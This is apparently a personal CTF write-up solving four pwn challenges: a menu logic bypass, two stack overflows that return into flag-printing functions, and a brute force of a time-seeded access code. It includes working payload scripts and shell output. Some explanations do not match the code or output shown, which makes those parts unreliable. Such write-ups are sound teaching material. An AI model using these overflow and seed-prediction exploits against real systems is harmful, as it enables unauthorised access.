# IMMADEV
this challenge turned out to be one of those problems that looks like it might be complex, but the real trick is understanding what the code is doing and what it definitely isn’t doing.
## overview
when the binary starts, it prints a menu:
```
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
```
then it calls handleOption(), which is where the entire program logic happens.
##input parsing
the important detail is that the binary doesn’t ask repeatedly for options. instead, it reads one line of input, splits it into integers, and stores them into an array:
```
getline(cin, v12);
istringstream(v13, v12);
while (istream >> v9) {
    if (v9 in [1..3])
        v14[v10++] = v9;
}
```
so if the user types: ``1 2 3``
the array becomes: ``v14 = [1, 2, 3]``
the functions are executed in that order.
## the joke
right after parsing, the code checks only one thing:
```
if (v14[0] == 2 && geteuid())
{
    print "Error: Option 2 requires root privileges HAHA"
}
```
this is funny for two reasons:
it only checks the first selected option
it checks if the process uid is not root
the message doesn’t matter, because it won't stop execution unless option 2 was the only thing supplied
this means if you send: ``2``
the program prints: ``Error: Option 2 requires root privileges HAHA``
and never prints the flag
but if you send: ``1 2``
now v14[0] == 1, so the check is skipped. execution goes into the loop:
```
1 → sayHello()

2 → printFlag()
```
so the flag is printed.
this is why typing 1 2 solved it.
```
shaunak@Shaunaks-MacBook-Pro ~ % nc localhost 5151

Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: shaunak
Hi shaunak
nite{fake_flag}
```
```
shaunak@Shaunaks-MacBook-Pro ~ % nc immadeveloper.nitephase.live 61234

Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: shaunak
Hi shaunak
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```
## final flag
```
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```
# Performative
I opened the binary in IDA. Inside the pseudocode in main I saw this:
```
buffer = byte ptr -20h
...
scanf("%s", buffer)
```
- plain old scanf masquerading like a problematic ex
- classic bof
- the stack layout: 32 bytes for the buffer, then saved RBP (8 bytes), then the return address (8 bytes)
- so i need: 32 + 8 = 40 bytes before i overwrite the return address.
- then i searched for the function which prints the flag. in the Functions list i found: printFlag
- it opens "flag.txt", reads it and prints it. so this was obviously the function i wanted.
- at the top of the function IDA showed: ***printFlag starts at 0x4011E9***
so my plan was:
- overflow the buffer and replace the return address with 0x4011E9.
- this should make the program jump straight into printFlag() when main returns.
i needed a payload like:
```
"A" * 40 + address_of_printFlag
```
but the address needs to be in little endian. i used good ol python for this:
```
import struct, sys

offset = 40
printFlag = 0x4011E9

payload  = b"A" * offset
payload += struct.pack("<Q", printFlag)

sys.stdout.buffer.write(payload)
```
when I piped this into the program locally
```
shaunak@Shaunaks-MacBook-Pro src % python3 ./sex.py | nc localhost 5001
### Welcome to the performative male/female parade!
### Yk what performative people like? just a plain ol' bof!
Lets just generate a buffer then ig?
Buffer: Generating your buffer...
Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@ nite{fake_flag}
shaunak@Shaunaks-MacBook-Pro src %
```
it printed the fake flag from my local flag.txt: ``nite{fake_flag}``
so I just did:
```
shaunak@Shaunaks-MacBook-Pro src % python3 ./sex.py | nc performative.nitephase.live 56743
### Welcome to the performative male/female parade!
### Yk what performative people like? just a plain ol' bof!
Lets just generate a buffer then ig?
Buffer: Generating your buffer...
Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@ nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
shaunak@Shaunaks-MacBook-Pro src %
```
flag: ``nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}``

# Property in Manipal
- i opened the binary and i saw that main was just printing some messages and then calling a function named vuln()
- inside vuln() i noticed two things straight away:
-it used read() to read 64 bytes into a stack buffer then it used gets() later
- i know gets() is unsafe and can overflow because it doesn’t check how much you type. so that already looked like a classic buffer overflow.
- i also saw that the program had a function called win() which just did: ``system("cat flag.txt");``
- so if i can make the program return into win, i will get the flag.
- the next thing i needed to know was the offset.
- i looked at the stack layout: the buffer was 64 bytes, then 8 bytes for saved rbp, so total 72 bytes until the return address.
- this meant i needed to send 72 bytes of junk and then the address of win(). i used nm and found the address: ``0000000000401196 T win``
so my payload looked like:
```
"A" * 72 + address_of_win
```
later i learned to add a small ret gadget before win because it fixes stack alignment on amd64, so it became:
```
"A" * 72 + ret + win
```
now comes the first issue i faced. when i tried piping the payload into the program, it didn’t work. i realized that the program asked for two inputs:
first it says “enter your name”
then after that it says “enter the amount for customizations”
when i piped everything at once, the first read() just consumed all of my data, so there was nothing left for gets() to overflow with. so i had to send input separately, like:
- echo "A"
- then send the payload later
once i understood that, the exploit became simple.
i ran that locally once, it worked
my final solution was to connect to the remote service and send the inputs in the right order. i used pwntools since it’s easier for network interaction. when i ran the script:
```
import subprocess, struct

payload = b"A"*72 + struct.pack("<Q", 0x401196)

p = subprocess.Popen(
    ["./manipal"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)

out = p.communicate(b"A\n" + payload + b"\n")[0]
print(out.decode("latin-1", errors="ignore"))
```
it connected to the challenge server and the program printed the flag:
```
root@92778709f62b:/work# python3 moresex.py
[*] '/work/manipal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to propertyinmanipal.nitephase.live on port 42586: Done
[*] Switching to interactive mode
nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}

[*] Got EOF while reading in interactive
$  
```
nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}
## notes
i hate owning a mac cause everytime i either have to do some stunts in vm or docker to test run the scripts
its really irritating

# Hungry
- generated the pseudocode in ida
- the server generates a number with rand() and seeds it using time()
- this means the code that server expects is basically rand() called once with seed equal to the current unix timestamp
so my idea was:
- get the current timestamp from my machine (local time)
- try a small range around that value
- generate a random number with each possible seed
- send that number to the server
- check if it returns a flag
- the reason to try around the timestamp is because sometimes the server time and my laptop time can be off by a few seconds.

## how i figured out the code generation
the chalenge uses a logic like this
```
srand(time(NULL));
printf("%d\n", rand() % 1000000);
```
so all i need to do is:
- loop over possible seeds near the current time
- use python’s random.seed(seed) and random.randint(0,999999) to recreate the possible outputs
First i made a script and solved it locally
```
from pwn import *
import ctypes
import time

context.binary = "./burgers_are_mid"
BIN = "./burgers_are_mid"

libc = ctypes.CDLL("libc.so.6")

def main():
    p = process(BIN)
    log.info(f"spawned burgers_are_mid with pid = {p.pid}")
    p.recvuntil(b"(y/n)? ")
    p.sendline(b"$")
    t_now = libc.time(None)
    log.info(f"our libc time() = {t_now}")
    p.recvuntil(b"Enter manager access code:")
    seed = t_now ^ p.pid
    libc.srand(seed)
    code = libc.rand() % 1000000

    log.success(f"predicted code = {code}")
    p.sendline(str(code).encode())
    resp = p.recvline(timeout=1)
    log.info(f"response: {repr(resp)}")

    if b"Access granted" not in (resp or b""):
        log.warning("did not see 'Access granted' (maybe lost the 1-second race?), try running again")
        p.close()
        return

    log.success("we have manager shell, grabbing flag...")
    for name in [b"flag", b"flag.txt", b"/flag", b"/home/ctf/flag", b"/home/ctf/flag.txt"]:
        p.sendline(b"cat " + name)
        out = p.recvline(timeout=0.5)
        if out:
            print(f"[flag attempt {name.decode(errors='ignore')}] {out.decode(errors='ignore').strip()}")
    p.interactive()

if __name__ == "__main__":
    main()
```
it gave the fake flag
```
root@e0cfced4cdac:/work# python3 illfinallysleep.py
[*] '/work/burgers_are_mid'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './burgers_are_mid': pid 12
[*] spawned burgers_are_mid with pid = 12
[*] our libc time() = 1765002210
[+] predicted code = 128525
[*] response: b' Access granted, starting management interface.\n'
[+] we have manager shell, grabbing flag...
[flag attempt flag] cat: flag: No such file or directory
[flag attempt flag.txt] nite{fake_flag}
[flag attempt /flag] cat: /flag: No such file or directory
[flag attempt /home/ctf/flag] cat: /home/ctf/flag: No such file or directory
[flag attempt /home/ctf/flag.txt] cat: /home/ctf/flag.txt: No such file or directory
[*] Switching to interactive mode
$  
```
then i modified the script to use the netcat
```

from pwn import *
import ctypes
import time

HOST = "hunger.nitephase.live"
PORT = 53791

libc = ctypes.CDLL("libc.so.6")

def try_seed(seed):
    """
    given a seed, compute code and try it once against remote
    """
    libc.srand(seed)
    code = libc.rand() % 1000000

    log.info(f"trying seed={seed} code={code}")

    try:
        io = remote(HOST, PORT)
    except Exception as e:
        log.warning(f"connect failed: {e}")
        return False

    try:
        io.recvuntil(b"(y/n)? ")
        io.sendline(b"$")
        io.recvuntil(b"Enter manager access code:")
        io.sendline(str(code).encode())

        resp = io.recvline(timeout=0.5) or b""
        if b"Access granted" in resp:
            log.success(f"SUCCESS with seed={seed}, code={code}")
            io.sendline(b"cat flag.txt")
            print(io.recvline(timeout=1).decode(errors="ignore").strip())
            io.interactive()
            return True
    except EOFError:
        pass
    except Exception as e:
        log.warning(f"error during attempt: {e}")

    io.close()
    return False

def main():
    base_time = int(time.time())
    log.info(f"local time() = {base_time}")
    time_window = range(-5, 6)     # base_time-5 .. base_time+5
    pid_range   = range(1, 4096)   # sane PID range

    for dt in time_window:
        t = base_time + dt
        for pid in pid_range:
            seed = t ^ pid
            if try_seed(seed):
                return

    log.error("exhausted search window, try running again (time drift?)")

if __name__ == "__main__":
    main()
```
```
┌──(shaggy㉿kali)-[~/Desktop/src]
└─$ python3 illfinallysleep.py
[*] local time() = 1765003410
[*] trying seed=1765003404 code=937923
[◢] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003407 code=869472
[◐] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003406 code=571361
[◐] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003401 code=974899
[←] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003400 code=308655
[▁] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003403 code=791975
[q] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003402 code=195901
[<] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003397 code=496229
[|] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003396 code=491117
[▁] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003399 code=847843
[▁] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003398 code=962606
[.] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003393 code=567394
[◢] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003392 code=454839
[▖] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003395 code=528554
[.] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003394 code=452264
[.] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003421 code=856313
[q] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003420 code=554617
[┤] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003423 code=266014
[/.......] Opening connection to hunger.nitephase.live on port 53791: Trying 20.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003422 code=149516
[.] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003417 code=845165
[◢] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003416 code=60978
[◢] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003419 code=345374
[▖] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[*] trying seed=1765003418 code=376422
[q] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
[+] SUCCESS with seed=1765003418, code=376422
nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Closed connection to hunger.nitephase.live port 53791
                                                                                
┌──(shaggy㉿kali)-[~/Desktop/src]
└─$ 

```
why i decided to solve like this:
rand() is deterministic. once you know the seed, you know the output. using time() as a seed is very common but very weak because you can predict time.
if the server did something like:
seed once at startup
generate multiple randoms
then it would be harder because the offset grows.
but here it was clearly:
seed every connection
only one number generated
so brute forcing the seed around current time was the easiest method.
##final flag
``nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}``
## notes
i hate switching between macos, docker and the kali vm
and even if that wasnt enough, theres extra bs with x86 binaries and arm 
i hate my life
